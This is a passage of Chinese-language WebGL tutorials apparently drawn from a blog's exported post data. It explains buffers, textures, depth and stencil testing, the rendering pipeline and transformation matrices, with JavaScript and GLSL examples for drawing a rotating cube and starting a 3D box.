gl.uniform1f，表示传递 1 个浮点数。 gl.uniform1fv, 表示传递一个 1 维的浮点数向量。 gl.uniform2f，表示传递 2 个浮点数。 gl.uniform2fv, 表示传递一个 2 维的浮点数向量。 缓冲对象（WebGLBuffer） 在 WebGL 中，顶点数据包括顶点坐标、颜色、法向量等信息，而索引数据用于指定顶点之间的连接关系，以便构建三角形网格。 缓冲区对象是 WebGL 系统中的一块内存区域，可以通过缓冲对象在 GPU 内存中存储大量的顶点和索引数据，来对数据进行排序、过滤、转换等操作，很方便地管理顶点和索引数据：一次性可以处理很多个顶点，充分发挥 GPU 并行渲染的能力，从而减少与 CPU 之间的数据传输，提高渲染效率 WebGL 提供了两种类型的缓冲对象： 顶点缓冲对象（Vertex Buffer Object，VBO）：用于存储顶点数据，包括顶点坐标、颜色、法向量等信息。 索引缓冲对象（Index Buffer Object，IBO）：用于存储索引数据，指定顶点之间的连接关系，以便构建三角形网格。 创建和管理 WebGL 缓冲对象可以在 WebGL 上下文中创建和管理。 创建缓冲对象：调用 WebGL 上下文的 createBuffer() 方法创建一个新的缓冲对象。 绑定缓冲对象： 通过调用 WebGL 上下文的 bindBuffer() 方法将缓冲对象绑定到指定的缓冲区类型上，例如 GL_ARRAY_BUFFER 或 GL_ELEMENT_ARRAY_BUFFER。 存储数据：通过调用 WebGL 上下文的 bufferData() 方法将数据存储到缓冲对象中。 使用缓冲对象：在绘制图形时，通过调用 WebGL 上下文的 drawArrays() 或 drawElements() 方法使用缓冲对象中的数据。 帧缓冲对象 帧缓冲对象（Framebuffer Object，FBO）是一个渲染目标，它包含了多个附加点（Attachment Point），每个附加点都可以绑定一个纹理或渲染缓冲区，用于渲染操作、存储渲染结果。 WebGL 缓冲对象和帧缓冲对象是两个不同的概念： 缓冲对象存储的数据类型可以是顶点坐标、法线、纹理坐标等，而帧缓冲对象存储的数据类型必须是颜色或深度值。 缓冲对象用于存储图形数据，例如顶点数据、颜色数据、法线数据等，而帧缓冲对象用于渲染到纹理或渲染缓冲区，实现高级的图形特效，例如反射、折射、阴影等。 缓冲对象的数据可以被用于多次绘制，而帧缓冲对象的数据只能被用于一次绘制。 纹理（Texture） 纹理是用于三维空间的二维图像，使物体看起来更好、更逼真。纹理是由称为纹素的单个纹理元素组合而成的，就像图片元素由像素组合而成一样。在渲染管道的片段处理阶段将纹理应用到物体上，允许我们在必要时通过包裹和过滤来调整它。 纹理可以是数字图像，如 PNG 或 JPG 文件，可以是二进制数据，也可以是从 HTML5 画布或视频元素提取的像素数据。 纹理数据可以通过各种方式加载，例如从图像文件加载、从 HTMLCanvasElement 对象中生成等，纹理数据通常被存储在 GPU 内存中，以提高渲染性能。 法线向量（normal vector） 法线向量是一种描述 3D 对象表面朝向的矢量，在渲染三维图形时，每个顶点通常都有一个法线向量。 法线向量可以用于计算光照和阴影效果。例如，可以使用法线向量来计算表面的漫反射光照效果，从而实现物体表面的阴影效果。 在计算光照效果时，需要将法线向量与光源的方向向量进行计算，以确定光线的入射角度和表面的反射情况。 测试（Testing） 测试用于决定是否绘制图形中的特定像素，是 WebGL 实现高级图形效果的核心要素之一。深度测试和模板测试可以用于实现许多不同的视觉效果，包括阴影、反射和折射等。测试过程中会丢弃掉部分无用的片元内容，然后生成可绘制的二维图像绘制并显示。 深度测试（Depth Testing）就是对 z 轴的值做测试，值比较小的片元内容会覆盖值比较大的（类似于近处的物体会遮挡远处物体）。 模板测试（Stencil Testing）可以理解为镜像观察，模拟观察者的观察行为，即标记所有镜像中出现的片元，最后只绘制有标记的内容。模板缓存存储了每个像素的模板值，开发人员可以将模板值与特定值进行比较，以决定哪些像素应该被绘制，哪些不应该被绘制。 光栅化（Rasterization） 在 WebGL 中，光栅是指将 3D 场景中的三角形转成 2D 像素的过程，而光栅化是指在这个过程中对每个像素进行颜色计算和屏幕位置分配的过程。通过图元装配生成的多边形，计算像素并填充，剔除不可见的部分，剪裁掉不在可视范围内的部分，最终生成可见的带有颜色数据的图形并绘制。 光栅化是渲染管线中的一个阶段，它将 3D 场景中的几何体转换为 2D 图像。在光栅化阶段，WebGL 将 3D 几何体的顶点转换为屏幕上的像素，以便在屏幕上呈现 3D 图形。此过程包括剪裁、投影、光栅化和深度测试等步骤。在光栅化过程中，WebGL 还会对像素进行深度测试，以确定哪些像素应该显示在屏幕上，哪些像素应该被遮挡。这个过程是通过使用光栅化器（Rasterizer）来实现的。 光栅化流程图解： 渲染管线 要渲染 3D 图形，我们必须遵循一系列步骤。这些步骤被称为图形管线或渲染管线。 渲染管线的流程中总是将上一步的结果作为下一步的输入，就像水管一样接起来，管线的名字也因此得来。 下图简要的展示了渲染管线的一个流程： 顶点着色器（可编程）：首先通过顶点着色器，确定我们设置的顶点位置。 图元装配：gl.drawArray 方法会指定图元装配的方式（点、线、三角形），根据我们设定的装配方式将其组装成我们想要的基本图形。 光栅化：实际上就是一个将上一步装配好的图形用像素来表示的过程。 片元着色器（可编程）：光栅化完成后，每个像素的片元都会执行片元着色器中的程序，得到最后的颜色值。 测试与混合：这一阶段主要是 WebGL 内部进行了一些模版测试、深度测试，最后再与上一帧的数据进行混合。 小结：WebGL 绘制图形的方式不是命令式的，而是 连接式 的，通过 WebGLRenderingContext 这个上下文将外部的变量与 GPU 内部的着色器程序发生联系。渲染管线就可以通过着色器运行出我们想要的结果，需要掌握的重难点就在于如何向 WebGL 中传入各种类型的数据。 矩阵（Matrix） 矩阵可以用于表示空间中的对象的变换，并且是 Web 页面可视化的重要工具。矩阵是许多不同技术使用的核心概念，包括 WebGL、WebXR（VR 和 AR）API 和 GLSL 着色器。 矩阵之所以重要，是因为它可以用少量的数字描述大量的空间中的变换，并且能轻易地在程序间共享。矩阵可以不同的坐标空间，甚至一些矩阵乘法可以将一组数据从一个坐标空间映射到另一个坐标空间。矩阵能够高效率地保存生成它们的每一步变换。 对于在 WebGL 中使用，显卡尤其擅长大量的点乘矩阵运算。各种各样的运算，如点定位、光线运算、动态角色，都依赖这个基础工具。 三维变换矩阵 这种矩阵由一个 4x4 方阵，共 16 个值组成。在 JavaScript 中，可以很方便的用数组表示矩阵。比如典型的单位矩阵：单位阵乘上一个点或者矩阵，其结果保持不变。 const identityMatrix = [ 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1 ]; 由于 3D 点只需要三个值（x、y、和 z），而变换矩阵是一个 4×4 值矩阵，为此我们加上了额外的第四维，这个维度称为透视，用字母表示 w。一般来说，把 w 设为 1 就可以了。 注意矩阵和点的对齐方式： [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1] [4, 3, 2, 1] // Point at [x, y, z, w] 下面定义了一个函数 multiplyMatrixAndPoint() 来乘以一个矩阵和一个点： function multiplyMatrixAndPoint(matrix, point) { // 给矩阵的每一部分一个简单的变量名，列数（c）与行数（r） let c0r0 = matrix[ 0], c1r0 = matrix[ 1], c2r0 = matrix[ 2], c3r0 = matrix[ 3]; let c0r1 = matrix[ 4], c1r1 = matrix[ 5], c2r1 = matrix[ 6], c3r1 = matrix[ 7]; let c0r2 = matrix[ 8], c1r2 = matrix[ 9], c2r2 = matrix[10], c3r2 = matrix[11]; let c0r3 = matrix[12], c1r3 = matrix[13], c2r3 = matrix[14], c3r3 = matrix[15]; // 定义点坐标 let x = point[0]; let y = point[1]; let z = point[2]; let w = point[3]; // 点坐标和第一列对应相乘，再求和 let resultX = (x * c0r0) + (y * c0r1) + (z * c0r2) + (w * c0r3); // 点坐标和第二列对应相乘，再求和 let resultY = (x * c1r0) + (y * c1r1) + (z * c1r2) + (w * c1r3); // 点坐标和第三列对应相乘，再求和 let resultZ = (x * c2r0) + (y * c2r1) + (z * c2r2) + (w * c2r3); // 点坐标和第四列对应相乘，再求和 let resultW = (x * c3r0) + (y * c3r1) + (z * c3r2) + (w * c3r3); return [resultX, resultY, resultZ, resultW] } 现在使用上面的函数，我们可以将一个点乘以矩阵。使用单位矩阵它应该返回一个与原始点相同的点，因为一个点（或任何其他矩阵）乘以单位矩阵总是等于它自己： // identityResult 等于 [4,3,2,1] let identityResult = multiplyMatrixAndPoint(identityMatrix, [4,3,2,1]); 除了把矩阵和点相乘，你也可以把两个矩阵相乘。之前的函数可以帮助我们简化这个过程： function multiplyMatrices(matrixA, matrixB) { // 将第二个矩阵按列切片 let column0 = [matrixB[0], matrixB[4], matrixB[8], matrixB[12]]; let column1 = [matrixB[1], matrixB[5], matrixB[9], matrixB[13]]; let column2 = [matrixB[2], matrixB[6], matrixB[10], matrixB[14]]; let column3 = [matrixB[3], matrixB[7], matrixB[11], matrixB[15]]; // 将每列分别和矩阵相乘 let result0 = multiplyMatrixAndPoint( matrixA, column0 ); let result1 = multiplyMatrixAndPoint( matrixA, column1 ); let result2 = multiplyMatrixAndPoint( matrixA, column2 ); let result3 = multiplyMatrixAndPoint( matrixA, column3 ); // 把结果重新组合成矩阵 return [ result0[0], result1[0], result2[0], result3[0], result0[1], result1[1], result2[1], result3[1], result0[2], result1[2], result2[2], result3[2], result0[3], result1[3], result2[3], result3[3] ] } let someMatrix = [ 4, 0, 0, 0, 0, 3, 0, 0, 0, 0, 5, 0, 4, 8, 4, 1 ] let identityMatrix = [ 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1 ]; // 返回 someMatrix 的数组表示 let someMatrixResult = multiplyMatrices(identityMatrix, someMatrix); 这些函数新建了大量数组，可能在实时运算时导致垃圾回收的巨大开销。在实际产品中最好使用优化过的函数。比如 glMatrix 就是一个注重速度和性能的库，它的核心是在更新循环之前分配目标数组。 平移矩阵 平移矩阵基于单位矩阵，它将一个对象沿 x，y，z 其中一个方向进行移动。最简单的想象平移的方式是设想拿起一个咖啡杯，咖啡杯必须保持直立和朝向相同以免咖啡洒出来。 你不能仅仅使用平移矩阵来喝咖啡，因为要喝咖啡，你必须能够倾斜或旋转杯子以将咖啡倒进嘴里。用来执行此操作的矩阵类型称为旋转矩阵。 let x = 50; let y = 100; let z = 0; // 将沿三个轴的距离放在平移矩阵的相应位置，然后乘以需要在三维空间中移动的点或矩阵 let translationMatrix = [ 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, x, y, z, 1 ]; 缩放矩阵 缩放矩阵使对象的高度、宽度和深度三个维度的其中之一变大或变小。在典型（笛卡尔）坐标系中，这将使得 x，y，z 坐标拉伸或收缩。 let w = 1.5; // width (x) let h = 0.7; // height (y) let d = 1; // depth (z) let scaleMatrix = [ w, 0, 0, 0, 0, h, 0, 0, 0, 0, d, 0, 0, 0, 0, 1 ]; 应用于每个宽度、高度和深度的变化量从左上角开始，以对角线的方式向右下角移动。 旋转矩阵 旋转矩阵比平移和缩放矩阵要稍复杂一些，其中用到了三角函数来完成旋转。 // 不借助矩阵将点绕原点旋转 let point = [10,2]; // 计算到原点的距离 let distance = Math.sqrt(point[0] * point[0] + point[1] * point[1]); // 60 度 let rotationInRadians = Math.PI / 3; let transformedPoint = [ Math.cos( rotationInRadians ) * distance, Math.sin( rotationInRadians ) * distance ]; 可以将上述步骤表示为一个矩阵，并且单独应用到 x，y，和 z 坐标。下面是绕 z 轴旋转的表示： let sin = Math.sin; let cos = Math.cos; let a = Math.PI * 0.3; // 转角 // 绕 Z 轴旋转，由于变换中没有透视，所以此时的旋转只会出现缩小 div let rotateZMatrix = [ cos(a), -sin(a), 0, 0, sin(a), cos(a), 0, 0, 0, 0, 1, 0, 0, 0, 0, 1 ]; 使用矩阵 使用矩阵的一个简单方法是使用 CSS3 里的 matrix3d 变换。首先，创建一个 &lt;div&gt; 并加上一些内容。 &lt;div id='move-me' class='transformable'&gt; &lt;h2&gt;Move me with a matrix&lt;/h2&gt; &lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit...&lt;/p&gt; &lt;/div&gt; 然后，创建一个 4×4 矩阵，要注意的是，即使矩阵由 4 行和 4 列组成，它也会折叠成一行 16 个值，因为在 JavaScript 中，矩阵总是存储在一维列表中。将其传入 matrix3d 变换以更新 &lt;div&gt; 的样式。 // 从矩阵数组创建 matrix3d 样式属性 function matrixArrayToCssMatrix(array) { return &quot;matrix3d(&quot; + array.join(',') + &quot;)&quot;; } // 获取 DOM 元素 let moveMe = document.getElementById('move-me'); // 返回结果如：&quot;matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 50, 100, 0, 1);&quot; let matrix3dRule = matrixArrayToCssMatrix( translationMatrix ); // 设置变换 moveMe.style.transform = matrix3dRule; 矩阵组合 矩阵的真正厉害之处在于矩阵的组合。 矩阵相乘的结果与顺序有关：两个数相乘时，a * b = c 和 b * a = c 都为真。例如 3 * 4 = 12 和 4 * 3 = 12。在数学中，这些数字称为可交换的。如果顺序交换，则不能保证矩阵相同，因此矩阵是不可交换的。 在 WebGL 和 CSS3 中的矩阵相乘需要和变换发生的顺序相反。例如，要将某个对象缩放对象到 80%，向下移动 200 像素，然后绕原点旋转 90 度： transformation = rotate * translate * scale 工作原理 可以简要概括为： WebGL 程序通过 JavaScript 发送渲染指令到浏览器。 浏览器使用图形卡(GPU)上的 OpenGL ES 系统来处理指令并执行实际渲染。 渲染输出被显示在 HTML5 canvas 元素上。 所以 WebGL 基本上是 JavaScript 与 OpenGL ES 之间的一个接口。它允许 JavaScript 访问 GPU 的功能,以便于高性能渲染和平台硬件加速渲染。 基本步骤 创建 WebGL 上下文： 由于 WebGL 需要在 web 浏览器中进行实时渲染，因此需要创建用于渲染的 WebGL 上下文。通常，这需要在 HTML 中使用特殊的 canvas 元素来实现。 const glCanvas = document.getElementById(&quot;glcanvas&quot;); const gl = glCanvas.getContext(&quot;webgl&quot;); 准备顶点数据、颜色数据和索引数据： 在 WebGL 中，需要将三维物体的顶点数据转化为浏览器可以识别的格式。这个过程通常涉及到将顶点坐标、法线向量、纹理坐标等数据存储在缓冲区中，并使用缓冲区对象来管理这些数据。 const vertices = [ -1, -1, -1, 1, -1, -1, 1, 1, -1, -1, 1, -1, -1, -1, 1, 1, -1, 1, 1, 1, 1, -1, 1, 1, -1, -1, -1, -1, 1, -1, -1, 1, 1, -1, -1, 1, 1, -1, -1, 1, 1, -1, 1, 1, 1, 1, -1, 1, -1, -1, -1, -1, -1, 1, 1, -1, 1, 1, -1, -1, -1, 1, -1, -1, 1, 1, 1, 1, 1, 1, 1, -1, ]; const colors = [ 5, 3, 7, 5, 3, 7, 5, 3, 7, 5, 3, 7, 1, 1, 3, 1, 1, 3, 1, 1, 3, 1, 1, 3, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0 ]; const indices = [ 0, 1, 2, 0, 2, 3, 4, 5, 6, 4, 6, 7, 8, 9, 10, 8, 10, 11, 12, 13, 14, 12, 14, 15, 16, 17, 18, 16, 18, 19, 20, 21, 22, 20, 22, 23 ]; 创建和配置顶点缓冲区和纹理缓冲区： 顶点缓冲区和纹理缓冲区是 WebGL 中另一个重要的组件，用于存储模型数据和纹理数据。通过创建并配置这些缓冲区，我们可以告诉 WebGL 如何读取和处理模型和纹理数据。 const vertex_buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, vertex_buffer); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW); // Create and store data into color buffer const color_buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, color_buffer); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(colors), gl.STATIC_DRAW); // Create and store data into index buffer const index_buffer = gl.createBuffer(); gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, index_buffer); gl.bufferData(gl.ELEMENT_ARRAY_BUFFER, new Uint16Array(indices), gl.STATIC_DRAW); 获取并编译着色器： WebGL 中的着色器是编写图形渲染程序的必要组件，其中顶点着色器和片段着色器是最重要的两种着色器类型。在 WebGL 中，我们需要先获取并编译这些着色器才能进一步使用它们。 const vertCode = ` attribute vec3 position; uniform mat4 Pmatrix; uniform mat4 Vmatrix; uniform mat4 Mmatrix; attribute vec3 color; //the color of the point varying vec3 vColor; void main(void) { gl_Position = Pmatrix * Vmatrix * Mmatrix * vec4(position, 1.); vColor = color; }`; const fragCode = ` precision mediump float; varying vec3 vColor; void main(void) { gl_FragColor = vec4(vColor, 1.); }`; const vertShader = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vertShader, vertCode); gl.compileShader(vertShader); const fragShader = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fragShader, fragCode); gl.compileShader(fragShader); const shaderprogram = gl.createProgram(); gl.attachShader(shaderprogram, vertShader); gl.attachShader(shaderprogram, fragShader); gl.linkProgram(shaderprogram); 将属性关联到顶点着色器： 属性可以通过顶点缓冲区将数据关联到顶点着色器中，以便在渲染过程中使用。这是 WebGL 中实现高效渲染的关键步骤之一。 const _Pmatrix = gl.getUniformLocation(shaderprogram, &quot;Pmatrix&quot;); const _Vmatrix = gl.getUniformLocation(shaderprogram, &quot;Vmatrix&quot;); const _Mmatrix = gl.getUniformLocation(shaderprogram, &quot;Mmatrix&quot;); gl.bindBuffer(gl.ARRAY_BUFFER, vertex_buffer); const _position = gl.getAttribLocation(shaderprogram, &quot;position&quot;); gl.vertexAttribPointer(_position, 3, gl.FLOAT, false, 0, 0); gl.enableVertexAttribArray(_position); gl.bindBuffer(gl.ARRAY_BUFFER, color_buffer); const _color = gl.getAttribLocation(shaderprogram, &quot;color&quot;); gl.vertexAttribPointer(_color, 3, gl.FLOAT, false, 0, 0); gl.enableVertexAttribArray(_color); gl.useProgram(shaderprogram); 处理矩阵： 可以使用矩阵来执行坐标变换、相机视图变换、透视变换等操作，从而实现各种三维绘图效果。WebGL 提供了一些内置的矩阵函数，可以用于执行基本的线性代数变换，例如 gl.uniformMatrix4fv。 function get_projection(angle, a, zMin, zMax) { const ang = Math.tan((angle * .5) * Math.PI / 180); //angle*.5 return [ 0.5 / ang, 0, 0, 0, 0, 0.5 * a / ang, 0, 0, 0, 0, -(zMax + zMin) / (zMax - zMin), -1, 0, 0, (-2 * zMax * zMin) / (zMax - zMin), 0 ]; } const proj_matrix = get_projection(40, canvas.width / canvas.height, 1, 100); const mo_matrix = [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]; const view_matrix = [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1]; view_matrix[14] = view_matrix[14] - 6; 绑定 DOM 事件，绘制图形： 在准备好顶点数据和着色器程序之后，可以使用 WebGL 的绘图函数来渲染图形。常用的绘图函数包括 gl.drawArrays 和 gl.drawElements。在绘制图形时，需要指定要使用的缓冲区、顶点数据的格式、着色器程序等。 通过修改渲染状态来控制更新绘制结果，例如设置深度测试、剔除面、光照模型等。如果需要在 WebGL 中生成动画，则需要定期更新每个帧的数据。对于每个帧，我们需要重新计算每个动画元素的状态，并在下一个渲染周期开始之前更新缓冲区中的数据。可以使用 requestAnimationFrame 方法实现连续的绘制循环。 /*================= Mouse events ======================*/ const AMORTIZATION = 0.95; let drag = false; let old_x, old_y; let dX = 0, dY = 0; const mouseDown = function(e) { drag = true; old_x = e.pageX, old_y = e.pageY; e.preventDefault(); return false; }; const mouseUp = function(e) { drag = false; }; const mouseMove = function(e) { if (!drag) return false; dX = (e.pageX - old_x) * 2 * Math.PI / canvas.width, dY = (e.pageY - old_y) * 2 * Math.PI / canvas.height; THETA += dX; PHI += dY; old_x = e.pageX, old_y = e.pageY; e.preventDefault(); }; canvas.addEventListener(&quot;mousedown&quot;, mouseDown, false); canvas.addEventListener(&quot;mouseup&quot;, mouseUp, false); canvas.addEventListener(&quot;mouseout&quot;, mouseUp, false); canvas.addEventListener(&quot;mousemove&quot;, mouseMove, false); /*=========================rotation================*/ function rotateX(m, angle) { const c = Math.cos(angle); const s = Math.sin(angle); const mv1 = m[1], mv5 = m[5], mv9 = m[9]; m[1] = m[1] * c - m[2] * s; m[5] = m[5] * c - m[6] * s; m[9] = m[9] * c - m[10] * s; m[2] = m[2] * c + mv1 * s; m[6] = m[6] * c + mv5 * s; m[10] = m[10] * c + mv9 * s; } function rotateY(m, angle) { const c = Math.cos(angle); const s = Math.sin(angle); const mv0 = m[0], mv4 = m[4], mv8 = m[8]; m[0] = c * m[0] + s * m[2]; m[4] = c * m[4] + s * m[6]; m[8] = c * m[8] + s * m[10]; m[2] = c * m[2] - s * mv0; m[6] = c * m[6] - s * mv4; m[10] = c * m[10] - s * mv8; } /*=================== Drawing =================== */ let THETA = 0, PHI = 0; let time_old = 0; const animate = function(time) { const dt = time - time_old; if (!drag) { dX *= AMORTIZATION, dY *= AMORTIZATION; THETA += dX, PHI += dY; } //set model matrix to I4 mo_matrix[0] = 1, mo_matrix[1] = 0, mo_matrix[2] = 0, mo_matrix[3] = 0, mo_matrix[4] = 0, mo_matrix[5] = 1, mo_matrix[6] = 0, mo_matrix[7] = 0, mo_matrix[8] = 0, mo_matrix[9] = 0, mo_matrix[10] = 1, mo_matrix[11] = 0, mo_matrix[12] = 0, mo_matrix[13] = 0, mo_matrix[14] = 0, mo_matrix[15] = 1; rotateY(mo_matrix, THETA); rotateX(mo_matrix, PHI); time_old = time; gl.enable(gl.DEPTH_TEST); // gl.depthFunc(gl.LEQUAL); gl.clearColor(0.5, 0.5, 0.5, 0.9); gl.clearDepth(1.0); gl.viewport(0.0, 0.0, canvas.width, canvas.height); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); gl.uniformMatrix4fv(_Pmatrix, false, proj_matrix); gl.uniformMatrix4fv(_Vmatrix, false, view_matrix); gl.uniformMatrix4fv(_Mmatrix, false, mo_matrix); gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, index_buffer); gl.drawElements(gl.TRIANGLES, indices.length, gl.UNSIGNED_SHORT, 0); window.requestAnimationFrame(animate); } animate(0); ","link":"https://zkrisj.github.io/post/webgl-gong-zuo-yuan-li/"},{"title":"WebGL - 制作 3D 立体盒子","content":"如何使用 WebGL WebGL 只关心两件事：裁剪空间中的坐标值和颜色值，使用 WebGL 只需要给它提供这两个东西。 需要提供两个着色器来做这两件事，一个顶点着色器提供裁剪空间坐标值，一个片段着色器提供颜色值。 WebGL 应用程序代码是 JavaScript 和 OpenGL 着色语言的组合。 JavaScript 需要与 CPU 进行沟通 OpenGL 着色语言（GLSL），需要与 GPU 通信 使用 JavaScript 编写以下操作的代码： 初始化 WebGL − 用于初始化 WebGL 的上下文。 创建数组 − 创建数组来保存几何数据。 缓冲区对象 − 通过将数组作为参数来创建缓冲区对象（顶点和索引）。 着色器 − 创建，编译和连接着色器。 属性 − 创建属性，启用它们并与缓冲区对象关联。 全局变量 − 创建全局变量。 变换矩阵 − 创建变换矩阵。 使用 OpenGL 着色语言（GLSL）编写着色器。 制作 3D 立体盒子 新建一个 canvas 元素并设置一个 onload 事件处理程序来初始化我们的 WebGL 上下文。 &lt;body onload=&quot;main()&quot;&gt; &lt;canvas id=&quot;glcanvas&quot; width=&quot;640&quot; height=&quot;480&quot;&gt; 你的浏览器似乎不支持或者禁用了 HTML5 &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; 元素。 &lt;/canvas&gt; &lt;/body&gt; 下面 JavaScript 代码中的 main() 函数将会在文档加载完成之后被调用。它的任务是设置 WebGL 上下文并开始渲染内容。 // 从这里开始 function main() { const canvas = document.querySelector(&quot;#glcanvas&quot;); // 初始化 WebGL 上下文 const gl = canvas.getContext(&quot;webgl&quot;); // 确认 WebGL 支持性 if (!gl) { alert(&quot;无法初始化 WebGL，你的浏览器、操作系统或硬件等可能不支持 WebGL。&quot;); return; } // 使用完全不透明的黑色清除所有图像 gl.clearColor(0.0, 0.0, 0.0, 1.0); // 用上面指定的颜色清除缓冲区 gl.clear(gl.COLOR_BUFFER_BIT); } 当我们获取到 canvas 之后，向 getContext 函数传递 &quot;webgl&quot; 参数，来获取 WebGLRenderingContext。 如果浏览器不支持 webgl, getContext 将会返回 null，我们就可以显示一条消息给用户然后退出。 在这个例子里，我们用黑色清除上下文内已有的元素（用背景颜色重绘 canvas）。 矩阵计算是一个很复杂的运算，通常使用一个矩阵运算库，而不会自己实现矩阵运算。我们使用的是 glMatrix 库来执行其矩阵操作，因此需要引入它，这里通过 CDN 形式引入使用。 我们要将物体画在一个三维空间里，需要创建着色器代码到 main() 函数中来渲染。 下面是顶点着色器： const vsSource = ` attribute vec4 aVertexPosition; uniform mat4 uModelViewMatrix; uniform mat4 uProjectionMatrix; void main() { gl_Position = uProjectionMatrix * uModelViewMatrix * aVertexPosition; } `; 顶点着色器的工作是将输入顶点从原始坐标系转换到 WebGL 使用的裁剪空间坐标系，需要对顶点坐标进行必要的转换，在每个顶点基础上进行其他调整或计算，然后通过将其保存在由 GLSL 提供的特殊变量（gl_Position）中来返回变换后的顶点。 上面的顶点着色器接收一个属性 aVertexPosition 定义的顶点位置值，这个值将与两个 4x4 的矩阵（uProjectionMatrix 和 uModelMatrix）相乘，乘积赋值给 gl_Position。 这里我们还没应用任何纹理，也没有计算任何光照效果。 下面是片段着色器： const fsSource = ` void main() { gl_FragColor = vec4(1.0, 1.0, 1.0, 1.0); } `; 片段着色器的职责是确定像素的颜色，通过指定应用到像素的纹理元素（也就是图形纹理中的像素），获取纹理元素的颜色，然后将适当的光照应用于颜色。 之后颜色存储在特殊变量 gl_FragColor 中，返回到 WebGL 层。 现在我们已经定义了两个着色器，我们需要将它们传递给 WebGL，编译并将它们连接在一起。将下面两个函数添加到 webgl-demo.js 文件中： // 初始化着色器程序，让 WebGL 知道如何绘制我们的数据 function initShaderProgram(gl, vsSource, fsSource) { const vertexShader = loadShader(gl, gl.VERTEX_SHADER, vsSource); const fragmentShader = loadShader(gl, gl.FRAGMENT_SHADER, fsSource); // 创建着色器程序 const shaderProgram = gl.createProgram(); gl.attachShader(shaderProgram, vertexShader); gl.attachShader(shaderProgram, fragmentShader); gl.linkProgram(shaderProgram); // 如果创建失败，alert if (!gl.getProgramParameter(shaderProgram, gl.LINK_STATUS)) { alert('Unable to initialize the shader program: ' + gl.getProgramInfoLog(shaderProgram)); return null; } return shaderProgram; } // 创建指定类型的着色器，上传 source 源码并编译 function loadShader(gl, type, source) { const shader = gl.createShader(type); // 将 source 发送到着色器对象 gl.shaderSource(shader, source); // 一旦着色器获取到 source，就编译着色器程序 gl.compileShader(shader); // 检查着色器参数 gl.COMPILE_STATUS 状态，查看是否编译成功 if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) { // 如果返回错误，则着色器无法编译，从编译器中获取日志信息并 alert alert('An error occurred compiling the shaders: ' + gl.getShaderInfoLog(shader)); gl.deleteShader(shader); return null; } // 如果着色器被加载并成功编译，则返回编译的着色器 return shader; } // 调用着色器初始化程序 const shaderProgram = initShaderProgram(gl, vsSource, fsSource); 通过调用 loadShader()，为着色器传递类型和来源，创建了两个着色器。 然后创建一个附加着色器的程序，将它们连接在一起。 如果编译或链接失败，代码将弹出 alert。 在创建着色器程序之后，我们需要查找 WebGL 返回分配的输入位置，我们有一个 attribute 和两个 uniform。 属性从缓冲区接收值，顶点着色器的每次迭代都从分配给该属性的缓冲区接收下一个值。 uniform 类似于 JavaScript 全局变量，它们在着色器的所有迭代中保持相同的值。 由于 attribute 和 uniform的位置是特定于单个着色器程序的，因此我们将它们存储在一起以使它们易于传递。 添加下面代码到 main() 函数中： const programInfo = { program: shaderProgram, attribLocations: { vertexPosition: gl.getAttribLocation(shaderProgram, 'aVertexPosition'), }, uniformLocations: { projectionMatrix: gl.getUniformLocation(shaderProgram, 'uProjectionMatrix'), modelViewMatrix: gl.getUniformLocation(shaderProgram, 'uModelViewMatrix'), }, }; 在画盒子中的正方形前，我们需要创建一个缓冲器来存储它的顶点。initBuffers() 函数可以有更多参数，来创建更复杂的三维物体。创建 init-buffers.js 文件： function initBuffers(gl) { const positionBuffer = initPositionBuffer(gl); return { position: positionBuffer, }; } function initPositionBuffer(gl) { // 为方块的位置创建一个缓冲区 const positionBuffer = gl.createBuffer(); // 选择 positionBuffer 作为应用缓冲区操作的对象 gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer); // 为正方形创建一个位置数组 const positions = [1.0, 1.0, -1.0, 1.0, 1.0, -1.0, -1.0, -1.0]; // 使用 Float32Array 来填充当前缓冲区，将位置列表传递给 WebGL 以构建方块 gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW); return positionBuffer; } export { initBuffers }; 当着色器和物体都创建好后，我们可以开始渲染这个场景了。因为我们这个例子不会产生动画，所以 drawScene() 方法非常简单。创建 draw-scene.js 文件： function drawScene(gl, programInfo, buffers) { gl.clearColor(0.0, 0.0, 0.0, 1.0); // Clear to black, fully opaque gl.clearDepth(1.0); // Clear everything gl.enable(gl.DEPTH_TEST); // Enable depth testing gl.depthFunc(gl.LEQUAL); // Near things obscure far things // 开始绘制之前清除画布 gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); // 创建一个透视矩阵，一种特殊的矩阵，用于模拟相机中透视的变形。 // 我们的视野是 45 度，设置 45 度的视图角度，并且设置一个适合实际图像的宽高比， // 指定在摄像机距离 0.1 到 100 单位长度的范围内的物体可见。 const fieldOfView = 45 * Math.PI / 180; // in radians const aspect = gl.canvas.clientWidth / gl.canvas.clientHeight; const zNear = 0.1; const zFar = 100.0; const projectionMatrix = mat4.create(); // 注意：glmatrix.js 始终将第一个参数作为接收结果的目的地 mat4.perspective(projectionMatrix, fieldOfView, 